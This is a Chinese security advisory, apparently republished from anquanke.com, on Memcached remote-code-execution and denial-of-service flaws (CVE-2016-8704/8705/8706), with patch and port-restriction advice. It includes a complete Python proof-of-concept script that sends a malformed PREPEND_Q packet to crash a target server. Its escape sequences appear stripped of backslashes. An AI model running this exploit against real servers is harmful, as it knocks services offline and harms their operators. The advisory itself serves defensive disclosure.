> 原文链接: https://www.anquanke.com//post/id/84827 


# 【漏洞预警】Memcached修复多处高危漏洞可导致代码执行、拒绝服务（14:45更新）


                                阅读量   
                                **163216**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t013deb4350387eac83.png)](https://p5.ssl.qhimg.com/t013deb4350387eac83.png)

****

**背景介绍**

Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。

Memcached是以LiveJournal旗下Danga Interactive公司的Brad Fitzpatric为首开发的一款软件。现在已成为mixi、hatena、Facebook、Vox、LiveJournal等众多服务中提高Web应用扩展性的重要因素。

Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。

本质上，它是一个简洁的key-value存储系统。

一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。

**<br>**

**漏洞描述**

2016年10月31日  **  Memcached发布安全补丁修复多个远程代码执行漏洞**，利用该漏洞黑客可以窃取在Memcached中存放的业务数据，或导致Memcached服务崩溃从而造成拒绝服务等危害，**安全客提醒用户应当及时升级官方版本至1.4.33版本。**

Memcached存在多个整数溢出漏洞，可导致远程代码执行。

这些漏洞存在于用于插入（inserting）、附加（appending,）、前置（prepending）、修改键值对的函数中，在SASL身份验证位置也存在问题。

**攻击者可以通过向服务器发送一个精心构造的Memcached命令实现该漏洞的利用。此外，这些漏洞还可以泄露敏感的进程信息，并且可以多次触发，利用这些敏感的进程信息，攻击者可以绕过像ASLR等常见的漏洞缓解机制。**

由于可以绕过这些通用的漏洞缓解机制，使得这些漏洞的危害尤为严重。

虽然Memcached文档中已经强烈建议将Memcached服务配置在可信任的网络环境中，但是仍有大量的Memcached服务可以在公网中直接访问。

此外，**即使Memcached部署在内网中，企业的安全管理人员仍然不能忽视此次更新的安全问题，黑客可能通过内网渗透、SSRF漏洞等，直接对部署在内网的服务发起攻击。**



**漏洞编号**

CVE-2016-8704 – Memcached Append/Prepend 远程代码执行漏洞

CVE-2016-8705 – Memcached Update 远程代码执行漏洞

CVE-2016-8706 – Memcached SASL身份验证远程代码执行漏洞

<br>

**漏洞利用代码（POC）：（下面代码可导致业务崩溃、拒绝服务，请勿轻易尝试）**

```
import struct
import socket
import sys
MEMCACHED_REQUEST_MAGIC = "x80"
OPCODE_PREPEND_Q = "x1a"
key_len = struct.pack("!H",0xfa)
extra_len = "x00"
data_type = "x00"
vbucket = "x00x00"
body_len = struct.pack("!I",0)
opaque = struct.pack("!I",0)
CAS = struct.pack("!Q",0)
body = "A"*1024
if len(sys.argv) != 3:
        print "./poc_crash.py &lt;server&gt; &lt;port&gt;"
packet = MEMCACHED_REQUEST_MAGIC + OPCODE_PREPEND_Q + key_len + extra_len
packet += data_type + vbucket + body_len + opaque + CAS
packet += body
set_packet = "set testkey 0 60 4rntestrn"
get_packet = "get testkeyrn"
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect((sys.argv[1],int(sys.argv[2])))
s1.sendall(set_packet)
print s1.recv(1024)
s1.close()
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((sys.argv[1],int(sys.argv[2])))
s2.sendall(packet)
print s2.recv(1024)
s2.close()
s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s3.connect((sys.argv[1],int(sys.argv[2])))
s3.sendall(get_packet)
s3.recv(1024)
s3.close()
```

**<br>**

**测试效果：**

[![](https://p3.ssl.qhimg.com/t01ec11c0dd33694557.png)](https://p3.ssl.qhimg.com/t01ec11c0dd33694557.png)



**国内影响统计：（以下数据来自fofa.so）**

[![](https://p3.ssl.qhimg.com/t0110b0b5125efdbfe9.png)](https://p3.ssl.qhimg.com/t0110b0b5125efdbfe9.png)

**<br>**

**漏洞细节**



技术细节、分析

[http://www.talosintelligence.com/reports/TALOS-2016-0219/](http://www.talosintelligence.com/reports/TALOS-2016-0219/)

[http://www.talosintelligence.com/reports/TALOS-2016-0220/](http://www.talosintelligence.com/reports/TALOS-2016-0220/)

[http://www.talosintelligence.com/reports/TALOS-2016-0221/](http://www.talosintelligence.com/reports/TALOS-2016-0221/)



**解决办法**

1.升级官方最新版本：1.4.33版本 [http://www.memcached.org/files/memcached-1.4.33.tar.gz](http://www.memcached.org/files/memcached-1.4.33.tar.gz)

2.限制Memcached 11211端口访问权限（如：禁止外网访问、仅限特定端口访问）



**参考链接**

[https://github.com/memcached/memcached/wiki/ReleaseNotes1433](https://github.com/memcached/memcached/wiki/ReleaseNotes1433)

[http://blog.talosintel.com/2016/10/memcached-vulnerabilities.html](http://blog.talosintel.com/2016/10/memcached-vulnerabilities.html)

[http://www.talosintelligence.com/reports/TALOS-2016-0219/](http://www.talosintelligence.com/reports/TALOS-2016-0219/)

[http://www.talosintelligence.com/reports/TALOS-2016-0220/](http://www.talosintelligence.com/reports/TALOS-2016-0220/)

[http://www.talosintelligence.com/reports/TALOS-2016-0221/](http://www.talosintelligence.com/reports/TALOS-2016-0221/)

[](http://www.talosintelligence.com/reports/TALOS-2016-0221/)

[![](https://p3.ssl.qhimg.com/t0138e19bff320606e1.jpg)](https://p3.ssl.qhimg.com/t0138e19bff320606e1.jpg)[![](https://p5.ssl.qhimg.com/t01cd0c43501719e155.jpg)](https://p5.ssl.qhimg.com/t01cd0c43501719e155.jpg)

 <br>
